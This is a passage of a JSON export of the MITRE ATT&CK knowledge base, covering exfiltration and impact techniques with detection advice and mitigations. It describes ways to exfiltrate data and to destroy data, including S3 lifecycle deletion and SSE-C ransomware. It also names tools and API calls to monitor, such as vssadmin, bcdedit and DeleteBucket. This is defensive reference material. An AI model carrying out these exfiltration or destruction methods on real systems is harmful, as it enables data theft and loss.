used. <a href=\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: University of Birmingham C2)</a> \n\nFor network infrastructure devices, collect AAA logging to monitor for <code>copy</code> commands being run to exfiltrate configuration files to non-standard destinations over unencrypted protocols such as TFTP.","platforms":["ESXi","Linux","macOS","Network Devices","Windows"],"dataSources":["Network Traffic: Network Traffic Flow","File: File Access","Network Traffic: Network Traffic Content","Command: Command Execution","Network Traffic: Network Connection Creation"],"mitigations":[{"id":"M1030","name":"Network Segmentation","description":"Follow best practices for network firewall configurations to allow only necessary ports and traffic to enter and exit the network. <a href=\"https://technet.microsoft.com/en-us/library/cc700828.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Firewall Design)</a>"},{"id":"M1031","name":"Network Intrusion Prevention","description":"Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary command and control infrastructure and malware can be used to mitigate activity at the network level."},{"id":"M1037","name":"Filter Network Traffic","description":"Enforce proxies and use dedicated servers for services such as DNS and only allow those systems to communicate over respective ports/protocols, instead of all systems within a network."},{"id":"M1057","name":"Data Loss Prevention","description":"Data loss prevention can detect and block sensitive data being sent over unencrypted protocols."}]}]},{"id":"T1052","name":"Exfiltration Over Physical Medium","description":"Adversaries may attempt to exfiltrate data via a physical medium, such as a removable drive. In certain circumstances, such as an air-gapped network compromise, exfiltration could occur via a physical medium or device introduced by a user. Such media could be an external hard drive, USB drive, cellular phone, MP3 player, or other removable storage and processing device. The physical medium or device could be used as the final exfiltration point or to hop between otherwise disconnected systems.","detection":"Monitor file access on removable media. Detect processes that execute when removable media are mounted.","platforms":["Linux","macOS","Windows"],"dataSources":["File: File Access","Drive: Drive Creation","Process: Process Creation","Command: Command Execution"],"mitigations":[{"id":"M1034","name":"Limit Hardware Installation","description":"Limit the use of USB devices and removable media within a network."},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"Disable Autorun if it is unnecessary. <a href=\"https://support.microsoft.com/en-us/kb/967715\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Disable Autorun)</a> Disallow or restrict removable media at an organizational policy level if they are not required for business operations. <a href=\"https://technet.microsoft.com/en-us/library/cc772540(v=ws.10).aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Removable Media Control)</a>"},{"id":"M1057","name":"Data Loss Prevention","description":"Data loss prevention can detect and block sensitive data being copied to physical mediums."}],"subTechniques":[{"id":"T1052.001","name":"Exfiltration over USB","description":"Adversaries may attempt to exfiltrate data over a USB connected physical device. In certain circumstances, such as an air-gapped network compromise, exfiltration could occur via a USB device introduced by a user. The USB device could be used as the final exfiltration point or to hop between otherwise disconnected systems.","detection":"Monitor file access on removable media. Detect processes that execute when removable media are mounted.","platforms":["Linux","Windows","macOS"],"dataSources":["Process: Process Creation","Drive: Drive Creation","File: File Access","Command: Command Execution"],"mitigations":[{"id":"M1034","name":"Limit Hardware Installation","description":"Limit the use of USB devices and removable media within a network."},{"id":"M1042","name":"Disable or Remove Feature or Program","description":"Disable Autorun if it is unnecessary. <a href=\"https://support.microsoft.com/en-us/kb/967715\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Disable Autorun)</a> Disallow or restrict removable media at an organizational policy level if they are not required for business operations. <a href=\"https://technet.microsoft.com/en-us/library/cc772540(v=ws.10).aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Removable Media Control)</a>"},{"id":"M1057","name":"Data Loss Prevention","description":"Data loss prevention can detect and block sensitive data being copied to USB devices."}]}]},{"id":"T1537","name":"Transfer Data to Cloud Account","description":"Adversaries may exfiltrate data by transferring the data, including through sharing/syncing and creating backups of cloud environments, to another cloud account they control on the same service.\n\nA defender who is monitoring for large transfers to outside the cloud environment through normal file transfers or over command and control channels may not be watching for data transfers to another account within the same cloud provider. Such transfers may utilize existing cloud provider APIs and the internal address space of the cloud provider to blend into normal traffic or avoid data transfers over external network interfaces. <a href=\"https://tldrsec.com/p/blog-lesser-known-aws-attacks\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TLDRSec AWS Attacks)</a>\n\nAdversaries may also use cloud-native mechanisms to share victim data with adversary-controlled cloud accounts, such as creating anonymous file sharing links or, in Azure, a shared access signature (SAS) URI. <a href=\"https://learn.microsoft.com/en-us/azure/storage/common/storage-sas-overview\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Azure Storage Shared Access Signature)</a>\n\nIncidents have been observed where adversaries have created backups of cloud instances and transferred them to separate accounts. <a href=\"https://www.justice.gov/file/1080281/download\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: DOJ GRU Indictment Jul 2018)</a>","detection":"Monitor account activity for attempts to share data, snapshots, or backups with untrusted or unusual accounts on the same cloud service provider. Monitor for anomalous file transfer activity between accounts and to untrusted VPCs. \n\nIn AWS, sharing an Elastic Block Store (EBS) snapshot, either with specified users or publicly, generates a ModifySnapshotAttribute event in CloudTrail logs. <a href=\"https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ebs-modifying-snapshot-permissions.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AWS EBS Snapshot Sharing)</a> Similarly, in Azure, creating a Shared Access Signature (SAS) URI for a Virtual Hard Disk (VHS) snapshot generates a \"Get Snapshot SAS URL\" event in Activity Logs. <a href=\"https://docs.microsoft.com/en-us/azure/storage/blobs/snapshots-overview\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Azure Blob Snapshots)</a> <a href=\"https://docs.microsoft.com/en-us/rest/api/storageservices/delegate-access-with-shared-access-signature\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Azure Shared Access Signature)</a>","platforms":["IaaS","Office Suite","SaaS"],"dataSources":["Cloud Storage: Cloud Storage Modification","Snapshot: Snapshot Creation","Snapshot: Snapshot Modification","Cloud Storage: Cloud Storage Metadata","Snapshot: Snapshot Metadata","Application Log: Application Log Content","Network Traffic: Network Traffic Content","Cloud Storage: Cloud Storage Creation"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Limit user account and IAM policies to the least privileges required."},{"id":"M1037","name":"Filter Network Traffic","description":"Implement network-based filtering restrictions to prohibit data transfers to untrusted VPCs."},{"id":"M1054","name":"Software Configuration","description":"Configure appropriate data sharing restrictions in cloud services. For example, external sharing in Microsoft SharePoint and Google Drive can be turned off altogether, blocked for certain domains, or restricted to certain users. <a href=\"https://support.google.com/a/answer/60781\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Google Workspace External Sharing)</a> <a href=\"https://learn.microsoft.com/en-us/sharepoint/turn-external-sharing-on-or-off\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft 365 External Sharing)</a>"},{"id":"M1057","name":"Data Loss Prevention","description":"Data loss prevention can prevent and block sensitive data from being shared with individuals outside an organization. <a href=\"https://learn.microsoft.com/en-us/purview/dlp-learn-about-dlp\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Purview Data Loss Prevention)</a> <a href=\"https://support.google.com/a/answer/9646351\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Google Workspace Data Loss Prevention)</a>"}],"subTechniques":[]},{"id":"T1567","name":"Exfiltration Over Web Service","description":"Adversaries may use an existing, legitimate external Web service to exfiltrate data rather than their primary command and control channel. Popular Web services acting as an exfiltration mechanism may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to compromise. Firewall rules may also already exist to permit traffic to these services.\n\nWeb service providers also commonly use SSL/TLS encryption, giving adversaries an added level of protection.","detection":"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. User behavior monitoring may help to detect abnormal patterns of activity.","platforms":["ESXi","Linux","macOS","Office Suite","SaaS","Windows"],"dataSources":["Network Traffic: Network Traffic Content","Network Traffic: Network Connection Creation","Command: Command Execution","Network Traffic: Network Traffic Flow","File: File Access","Application Log: Application Log Content"],"mitigations":[{"id":"M1021","name":"Restrict Web-Based Content","description":"Web proxies can be used to enforce an external network communication policy that prevents use of unauthorized external services."},{"id":"M1057","name":"Data Loss Prevention","description":"Data loss prevention can be detect and block sensitive data being uploaded to web services via web browsers."}],"subTechniques":[{"id":"T1567.001","name":"Exfiltration to Code Repository","description":"Adversaries may exfiltrate data to a code repository rather than over their primary command and control channel. Code repositories are often accessible via an API (ex: https://api.github.com). Access to these APIs are often over HTTPS, which gives the adversary an additional level of protection.\n\nExfiltration to a code repository can also provide a significant amount of cover to the adversary if it is a popular service already used by hosts within the network.","detection":"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server) to code repositories. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. User behavior monitoring may help to detect abnormal patterns of activity.","platforms":["ESXi","Linux","macOS","Windows"],"dataSources":["Command: Command Execution","Network Traffic: Network Traffic Content","Network Traffic: Network Traffic Flow","File: File Access"],"mitigations":[{"id":"M1021","name":"Restrict Web-Based Content","description":"Web proxies can be used to enforce an external network communication policy that prevents use of unauthorized external services."}]},{"id":"T1567.002","name":"Exfiltration to Cloud Storage","description":"Adversaries may exfiltrate data to a cloud storage service rather than over their primary command and control channel. Cloud storage services allow for the storage, edit, and retrieval of data from a remote cloud storage server over the Internet.\n\nExamples of cloud storage services include Dropbox and Google Docs. Exfiltration to these cloud storage services can provide a significant amount of cover to the adversary if hosts within the network are already communicating with the service.","detection":"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server) to known cloud storage services. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. User behavior monitoring may help to detect abnormal patterns of activity.","platforms":["ESXi","Linux","macOS","Windows"],"dataSources":["Network Traffic: Network Traffic Content","Network Traffic: Network Connection Creation","Network Traffic: Network Traffic Flow","File: File Access","Command: Command Execution"],"mitigations":[{"id":"M1021","name":"Restrict Web-Based Content","description":"Web proxies can be used to enforce an external network communication policy that prevents use of unauthorized external services."}]},{"id":"T1567.003","name":"Exfiltration to Text Storage Sites","description":"Adversaries may exfiltrate data to text storage sites instead of their primary command and control channel. Text storage sites, such as <code>pastebin[.]com</code>, are commonly used by developers to share code and other information.  \n\nText storage sites are often used to host malicious code for C2 communication (e.g., Stage Capabilities), but adversaries may also use these sites to exfiltrate collected data. Furthermore, paid features and encryption options may allow adversaries to conceal and store data more securely. <a href=\"https://web.archive.org/web/20201107203304/https://www.echosec.net/blog/what-is-pastebin-and-why-do-hackers-love-it\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Pastebin EchoSec)</a>\n\n<strong>Note:</strong> This is distinct from Exfiltration to Code Repository, which highlight access to code repositories via APIs.","detection":"","platforms":["Linux","macOS","Windows","ESXi"],"dataSources":["Network Traffic: Network Traffic Content","Network Traffic: Network Traffic Flow"],"mitigations":[{"id":"M1021","name":"Restrict Web-Based Content","description":"Web proxies can be used to enforce an external network communication policy that prevents use of unauthorized external services."}]},{"id":"T1567.004","name":"Exfiltration Over Webhook","description":"Adversaries may exfiltrate data to a webhook endpoint rather than over their primary command and control channel. Webhooks are simple mechanisms for allowing a server to push data over HTTP/S to a client without the need for the client to continuously poll the server. <a href=\"https://www.redhat.com/en/topics/automation/what-is-a-webhook\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: RedHat Webhooks)</a> Many public and commercial services, such as Discord, Slack, and <code>webhook.site</code>, support the creation of webhook endpoints that can be used by other services, such as Github, Jira, or Trello. <a href=\"https://support.discord.com/hc/en-us/articles/228383668-Intro-to-Webhooks\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Discord Intro to Webhooks)</a> When changes happen in the linked services (such as pushing a repository update or modifying a ticket), these services will automatically post the data to the webhook endpoint for use by the consuming application. \n\nAdversaries may link an adversary-owned environment to a victim-owned SaaS service to achieve repeated Automated Exfiltration of emails, chat messages, and other data. <a href=\"https://github.com/pushsecurity/saas-attacks/blob/main/techniques/webhooks/description.md\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Push Security SaaS Attacks Repository Webhooks)</a> Alternatively, instead of linking the webhook endpoint to a service, an adversary can manually post staged data directly to the URL in order to exfiltrate it. <a href=\"https://www.microsoft.com/security/blog/2023/10/03/defending-new-vectors-threat-actors-attempt-sql-server-to-cloud-lateral-movement/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft SQL Server)</a>\n\nAccess to webhook endpoints is often over HTTPS, which gives the adversary an additional level of protection. Exfiltration leveraging webhooks can also blend in with normal network traffic if the webhook endpoint points to a commonly used SaaS application or collaboration service. <a href=\"https://www.cyberark.com/resources/threat-research-blog/the-not-so-secret-war-on-discord\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CyberArk Labs Discord)</a> <a href=\"https://blog.talosintelligence.com/collab-app-abuse/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Talos Discord Webhook Abuse)</a> <a href=\"https://medium.com/checkmarx-security/webhook-party-malicious-packages-caught-exfiltrating-data-via-legit-webhook-services-6e046b07d191\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Checkmarx Webhooks)</a>","detection":"","platforms":["ESXi","Linux","macOS","Office Suite","SaaS","Windows"],"dataSources":["Application Log: Application Log Content","Command: Command Execution","Network Traffic: Network Traffic Flow","Network Traffic: Network Traffic Content","File: File Access"],"mitigations":[{"id":"M1057","name":"Data Loss Prevention","description":"Data loss prevention can be detect and block sensitive data being uploaded to web services via web browsers."}]}]}]},{"tactic":"Impact","techniques":[{"id":"T1485","name":"Data Destruction","description":"Adversaries may destroy data and files on specific systems or in large numbers on a network to interrupt availability to systems, services, and network resources. Data destruction is likely to render stored data irrecoverable by forensic techniques through overwriting files or data on local and remote drives. <a href=\"https://www.symantec.com/connect/blogs/shamoon-attacks\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Symantec Shamoon 2012)</a> <a href=\"https://www.fireeye.com/blog/threat-research/2016/11/fireeye_respondsto.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FireEye Shamoon Nov 2016)</a> <a href=\"http://researchcenter.paloaltonetworks.com/2016/11/unit42-shamoon-2-return-disttrack-wiper/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Palo Alto Shamoon Nov 2016)</a> <a href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07180722/Report_Shamoon_StoneDrill_final.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kaspersky StoneDrill 2017)</a> <a href=\"https://unit42.paloaltonetworks.com/shamoon-3-targets-oil-gas-organization/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Unit 42 Shamoon3 2018)</a> <a href=\"https://blog.talosintelligence.com/2018/02/olympic-destroyer.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Talos Olympic Destroyer 2018)</a> Common operating system file deletion commands such as <code>del</code> and <code>rm</code> often only remove pointers to files without wiping the contents of the files themselves, making the files recoverable by proper forensic methodology. This behavior is distinct from Disk Content Wipe and Disk Structure Wipe because individual files are destroyed rather than sections of a storage disk or the disk's logical structure.\n\nAdversaries may attempt to overwrite files and directories with randomly generated data to make it irrecoverable. <a href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07180722/Report_Shamoon_StoneDrill_final.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kaspersky StoneDrill 2017)</a> <a href=\"https://unit42.paloaltonetworks.com/shamoon-3-targets-oil-gas-organization/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Unit 42 Shamoon3 2018)</a> In some cases politically oriented image files have been used to overwrite data. <a href=\"https://www.fireeye.com/blog/threat-research/2016/11/fireeye_respondsto.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FireEye Shamoon Nov 2016)</a> <a href=\"http://researchcenter.paloaltonetworks.com/2016/11/unit42-shamoon-2-return-disttrack-wiper/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Palo Alto Shamoon Nov 2016)</a> <a href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07180722/Report_Shamoon_StoneDrill_final.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kaspersky StoneDrill 2017)</a>\n\nTo maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware designed for destroying data may have worm-like features to propagate across a network by leveraging additional techniques like Valid Accounts, OS Credential Dumping, and SMB/Windows Admin Shares. <a href=\"https://www.symantec.com/connect/blogs/shamoon-attacks\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Symantec Shamoon 2012)</a> <a href=\"https://www.fireeye.com/blog/threat-research/2016/11/fireeye_respondsto.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FireEye Shamoon Nov 2016)</a> <a href=\"http://researchcenter.paloaltonetworks.com/2016/11/unit42-shamoon-2-return-disttrack-wiper/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Palo Alto Shamoon Nov 2016)</a> <a href=\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07180722/Report_Shamoon_StoneDrill_final.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kaspersky StoneDrill 2017)</a> <a href=\"https://blog.talosintelligence.com/2018/02/olympic-destroyer.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Talos Olympic Destroyer 2018)</a>.\n\nIn cloud environments, adversaries may leverage access to delete cloud storage objects, machine images, database instances, and other infrastructure crucial to operations to damage an organization or their customers. <a href=\"https://threatpost.com/hacker-puts-hosting-service-code-spaces-out-of-business/106761/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Data Destruction - Threat Post)</a> <a href=\"https://www.justice.gov/usao-ndca/pr/san-jose-man-pleads-guilty-damaging-cisco-s-network\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: DOJ  - Cisco Insider)</a> Similarly, they may delete virtual machines from on-prem virtualized environments.","detection":"Use process monitoring to monitor the execution and command-line parameters of binaries that could be involved in data destruction activity, such as SDelete. Monitor for the creation of suspicious files as well as high unusual file modification activity. In particular, look for large quantities of file modifications in user directories and under <code>C:\\Windows\\System32\\</code>.\n\nIn cloud environments, the occurrence of anomalous high-volume deletion events, such as the <code>DeleteDBCluster</code> and <code>DeleteGlobalCluster</code> events in AWS, or a high quantity of data deletion events, such as <code>DeleteBucket</code>, within a short period of time may indicate suspicious activity.","platforms":["Containers","ESXi","IaaS","Linux","macOS","Windows"],"dataSources":["Snapshot: Snapshot Deletion","Cloud Storage: Cloud Storage Modification","Process: Process Creation","File: File Deletion","Image: Image Deletion","Instance: Instance Deletion","File: File Modification","Volume: Volume Deletion","Cloud Storage: Cloud Storage Deletion","Command: Command Execution"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"In cloud environments, limit permissions to modify cloud bucket lifecycle policies (e.g., <code>PutLifecycleConfiguration</code> in AWS) to only those accounts that require it. In AWS environments, consider using Service Control policies to limit the use of the <code>PutBucketLifecycle</code> API call."},{"id":"M1032","name":"Multi-factor Authentication","description":"Implement multi-factor authentication (MFA) delete for cloud storage resources, such as AWS S3 buckets, to prevent unauthorized deletion of critical data and infrastructure. MFA delete requires additional authentication steps, making it significantly more difficult for adversaries to destroy data without proper credentials. This additional security layer helps protect against the impact of data destruction in cloud environments by ensuring that only authenticated actions can irreversibly delete storage or machine images."},{"id":"M1053","name":"Data Backup","description":"Consider implementing IT disaster recovery plans that contain procedures for taking regular data backups that can be used to restore organizational data. <a href=\"https://www.ready.gov/business/implementation/IT\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Ready.gov IT DRP)</a> Ensure backups are stored off system and protected from common methods adversaries may use to gain access and destroy the backups to prevent recovery."}],"subTechniques":[{"id":"T1485.001","name":"Lifecycle-Triggered Deletion","description":"Adversaries may modify the lifecycle policies of a cloud storage bucket to destroy all objects stored within.  \n\nCloud storage buckets often allow users to set lifecycle policies to automate the migration, archival, or deletion of objects after a set period of time. <a href=\"https://docs.aws.amazon.com/AmazonS3/latest/userguide/object-lifecycle-mgmt.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AWS Storage Lifecycles)</a> <a href=\"https://cloud.google.com/storage/docs/lifecycle\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GCP Storage Lifecycles)</a> <a href=\"https://learn.microsoft.com/en-us/azure/storage/blobs/lifecycle-management-policy-configure?tabs=azure-portal\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Azure Storage Lifecycles)</a> If a threat actor has sufficient permissions to modify these policies, they may be able to delete all objects at once. \n\nFor example, in AWS environments, an adversary with the <code>PutLifecycleConfiguration</code> permission may use the <code>PutBucketLifecycle</code> API call to apply a lifecycle policy to an S3 bucket that deletes all objects in the bucket after one day. <a href=\"https://www.paloaltonetworks.com/blog/prisma-cloud/ransomware-data-protection-cloud/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Palo Alto Cloud Ransomware)</a> <a href=\"https://www.halcyon.ai/blog/abusing-aws-native-services-ransomware-encrypting-s3-buckets-with-sse-c\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Halcyon AWS Ransomware 2025)</a> In addition to destroying data for purposes of extortion and Financial Theft, adversaries may also perform this action on buckets storing cloud logs for Indicator Removal. <a href=\"https://stratus-red-team.cloud/attack-techniques/AWS/aws.defense-evasion.cloudtrail-lifecycle-rule/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Datadog S3 Lifecycle CloudTrail Logs)</a>","detection":"","platforms":["IaaS"],"dataSources":["Cloud Storage: Cloud Storage Modification"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"In cloud environments, limit permissions to modify cloud bucket lifecycle policies (e.g., <code>PutLifecycleConfiguration</code> in AWS) to only those accounts that require it. In AWS environments, consider using Service Control policies to limit the use of the <code>PutBucketLifecycle</code> API call."},{"id":"M1053","name":"Data Backup","description":"Consider implementing IT disaster recovery plans that contain procedures for taking regular data backups that can be used to restore organizational data. <a href=\"https://www.ready.gov/business/implementation/IT\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Ready.gov IT DRP)</a> Ensure backups are stored off system and protected from common methods adversaries may use to gain access and destroy the backups to prevent recovery."}]}]},{"id":"T1486","name":"Data Encrypted for Impact","description":"Adversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources. They can attempt to render stored data inaccessible by encrypting files or data on local and remote drives and withholding access to a decryption key. This may be done in order to extract monetary compensation from a victim in exchange for decryption or a decryption key (ransomware) or to render data permanently inaccessible in cases where the key is not saved or transmitted. <a href=\"https://www.us-cert.gov/ncas/alerts/TA16-091A\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: US-CERT Ransomware 2016)</a> <a href=\"https://www.fireeye.com/blog/threat-research/2017/05/wannacry-malware-profile.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FireEye WannaCry 2017)</a> <a href=\"https://www.us-cert.gov/ncas/alerts/TA17-181A\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: US-CERT NotPetya 2017)</a> <a href=\"https://www.us-cert.gov/ncas/alerts/AA18-337A\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: US-CERT SamSam 2018)</a>\n\nIn the case of ransomware, it is typical that common user files like Office documents, PDFs, images, videos, audio, text, and source code files will be encrypted (and often renamed and/or tagged with specific file markers). Adversaries may need to first employ other behaviors, such as File and Directory Permissions Modification or System Shutdown/Reboot, in order to unlock and/or gain access to manipulate these files. <a href=\"https://www.carbonblack.com/blog/tau-threat-discovery-conti-ransomware/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CarbonBlack Conti July 2020)</a> In some cases, adversaries may encrypt critical system files, disk partitions, and the MBR. <a href=\"https://www.us-cert.gov/ncas/alerts/TA17-181A\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: US-CERT NotPetya 2017)</a> Adversaries may also encrypt virtual machines hosted on ESXi or other hypervisors. <a href=\"https://www.crowdstrike.com/en-us/blog/hypervisor-jackpotting-ecrime-actors-increase-targeting-of-esxi-servers/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Crowdstrike Hypervisor Jackpotting Pt 2 2021)</a> \n\nTo maximize impact on the target organization, malware designed for encrypting data may have worm-like features to propagate across a network by leveraging other attack techniques like Valid Accounts, OS Credential Dumping, and SMB/Windows Admin Shares. <a href=\"https://www.fireeye.com/blog/threat-research/2017/05/wannacry-malware-profile.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FireEye WannaCry 2017)</a> <a href=\"https://www.us-cert.gov/ncas/alerts/TA17-181A\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: US-CERT NotPetya 2017)</a> Encryption malware may also leverage Internal Defacement, such as changing victim wallpapers or ESXi server login messages, or otherwise intimidate victims by sending ransom notes or other messages to connected printers (known as \"print bombing\"). <a href=\"https://digital.nhs.uk/cyber-alerts/2020/cc-3681#summary\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: NHS Digital Egregor Nov 2020)</a> <a href=\"https://www.varonis.com/blog/vmware-esxi-in-the-line-of-ransomware-fire\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Varonis)</a>\n\nIn cloud environments, storage objects within compromised accounts may also be encrypted. <a href=\"https://rhinosecuritylabs.com/aws/s3-ransomware-part-1-attack-vector/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Rhino S3 Ransomware Part 1)</a> For example, in AWS environments, adversaries may leverage services such as AWS’s Server-Side Encryption with Customer Provided Keys (SSE-C) to encrypt data. <a href=\"https://www.halcyon.ai/blog/abusing-aws-native-services-ransomware-encrypting-s3-buckets-with-sse-c\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Halcyon AWS Ransomware 2025)</a>","detection":"Use process monitoring to monitor the execution and command line parameters of binaries involved in data destruction activity, such as vssadmin, wbadmin, and bcdedit. Monitor for the creation of suspicious files as well as unusual file modification activity. In particular, look for large quantities of file modifications in user directories.\n\nIn some cases, monitoring for unusual kernel driver installation activity can aid in detection.\n\nIn cloud environments, monitor for events that indicate storage objects have been anomalously replaced by copies.","platforms":["ESXi","IaaS","Linux","macOS","Windows"],"dataSources":["File: File Modification","Cloud Storage: Cloud Storage Modification","Network Share: Network Share Access","File: File Creation","Command: Command Execution","Process: Process Creation"],"mitigations":[{"id":"M1040","name":"Behavior Prevention on Endpoint","description":"On Windows 10, enable cloud-delivered protection and Attack Surface Reduction (ASR) rules to block the execution of files that resemble ransomware. <a href=\"https://docs.microsoft.com/microsoft-365/security/defender-endpoint/attack-surface-reduction\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: win10_asr)</a> In AWS environments, create an IAM policy to restrict or block the use of SSE-C on S3 buckets. <a href=\"https://www.halcyon.ai/blog/abusing-aws-native-services-ransomware-encrypting-s3-buckets-with-sse-c\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Halcyon AWS Ransomware 2025)</a>"},{"id":"M1053","name":"Data Backup","description":"Consider implementing IT disaster recovery plans that contain procedures for regularly taking and testing data backups that can be used to restore organizational data. <a href=\"https://www.ready.gov/business/implementation/IT\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Ready.gov IT DRP)</a> Ensure backups are stored off system and is protected from common methods adversaries may use to gain access and destroy the backups to prevent recovery. Consider enabling versioning in cloud environments to maintain backup copies of storage objects. <a href=\"https://rhinosecuritylabs.com/aws/s3-ransomware-part-2-prevention-and-defense/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Rhino S3 Ransomware Part 2)</a>"}],"subTechniques":[]},{"id":"T1489","name":"Service Stop","description":"Adversaries may stop or disable services on a system to render those services unavailable to legitimate users. Stopping critical services or processes can inhibit or stop response to an incident or aid in the adversary's overall objectives to cause damage to the environment. <a href=\"https://blog.talosintelligence.com/2018/02/olympic-destroyer.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Talos Olympic Destroyer 2018)</a> <a href=\"https://web.archive.org/web/20160226161828/https://www.operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Report.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Novetta Blockbuster)</a> \n\nAdversaries may accomplish this by disabling individual services of high importance to an organization, such as <code>MSExchangeIS</code>, which will make Exchange content inaccessible. <a href=\"https://web.archive.org/web/20160226161828/https://www.operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Report.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Novetta Blockbuster)</a> In some cases, adversaries may stop or disable many or all services to render systems unusable. <a href=\"https://blog.talosintelligence.com/2018/02/olympic-destroyer.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Talos Olympic Destroyer 2018)</a> Services or processes may not allow for modification of their data stores while running. Adversaries may stop services or processes in order to conduct Data Destruction or Data Encrypted for Impact on the data stores of services like Exchange and SQL Server, or on virtual machines hosted on ESXi infrastructure. <a href=\"https://www.secureworks.com/research/wcry-ransomware-analysis\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SecureWorks WannaCry Analysis)</a> <a href=\"https://www.crowdstrike.com/en-us/blog/hypervisor-jackpotting-ecrime-actors-increase-targeting-of-esxi-servers/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Crowdstrike 